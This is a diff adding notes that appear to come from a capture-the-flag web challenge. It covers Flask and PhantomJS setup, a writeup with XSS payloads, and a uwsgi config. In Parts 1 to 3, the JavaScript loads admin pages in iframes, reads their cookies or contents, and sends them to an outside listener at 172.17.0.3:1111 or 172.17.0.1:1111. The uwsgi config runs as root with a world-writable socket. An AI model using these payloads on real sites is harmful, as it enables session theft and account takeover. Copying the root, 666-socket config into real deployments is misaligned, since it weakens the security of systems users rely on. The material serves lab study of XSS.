@@ -1,0 +1,79 @@
+apt install python && \
+apt install python-pip && \
+apt install sqlite
+
+pip install -r 
+
+flask
+flask_bootstrap
+flask_login
+flask_sqlalchemy
+flask_wtf
+wtforms
+
+apt install phantomjs
+
+vim /user/bin/phantomjs
+export QT_QPA_PLATFORM=offscreen
+export QT_QPA_FONTDIE=/user/share/fonts
+
+
+
+Writeup
+
+Part 1
+
+var f= document.createElement('iframe'); f.setAttribute('src','/admin'); document.body.appendChild(f);
+var a= f.contentWindow.document.cookie;var k= document.createElement("link");k.setAttribute("rel","prefetch");k.setAttribute("href","http://172.17.0.3:1111/?a="+a);document.head.appendChild(k);
+
+
+
+Part 2
+
+var iframe = document.createElement('iframe');
+iframe.setAttribute('src','/admin/');
+document.body.appendChild(iframe);
+
+window.XMLHttpRequest=window.top.frames[0].XMLHttpRequest;var xhr = new XMLHttpRequest();xhr.open("GET", "http://127.0.0.1:9990/admin",false);xhr.send();a=xhr.responseText;window.location.href="http://172.17.0.3:1111/?a="+a.substring(1,100);
+
+
+<script src="/show/9732f50e-cd7a-11e8-b20f-0242ac110002"> </script>
+<script src="/show/9beb48da-cd7a-11e8-89f9-0242ac110002"> </script>
+
+Part 3
+var f= document.createElement('iframe');
+f.setAttribute('src','/admin/mysecrecy_directory');
+document.body.appendChild(f);
+
+f.addEventListener('load',function(){
+var a= f.contentWindow.document.cookie;var k= document.createElement("link");k.setAttribute("rel", "prefetch");k.setAttribute("href", "http://172.17.0.3:1111/?a="+a);
+document.head.appendChild(k);
+},false)
+
+var f= document.createElement('iframe'); f.setAttribute('src','/admin/mysecrecy_directory'); document.body.appendChild(f);
+function sleep(d){
+  for(var t = Date.now();Date.now() - t <= d;);
+}
+
+f.onload = function(){
+var a= f.contentWindow.document.cookie;
+var k= document.createElement("link");k.setAttribute("rel","prefetch");k.setAttribute("href", "http://172.17.0.3:1111/?a="+a);
+document.head.appendChild(k);}
+
+
+<script>
+var f= document.createElement('iframe'); f.setAttribute('src','/administrator/'); document.body.appendChild(f);
+f.onload = function(){
+var a= f.contentWindow.document.cookie;var k= document.createElement("link");k.setAttribute("rel","prefetch");k.setAttribute("href","http://172.17.0.1:1111/?a="+a);document.head.appendChild(k);}
+</script>
+
+[uwsgi]
+chmod-socket= 666
+uid = root
+gid = root
+chdir = /var/www/html/
+wsgi-file = run.py
+socket = /tmp/uwsgi.sock
+callable = app
+processes = 4 
+threads = 2
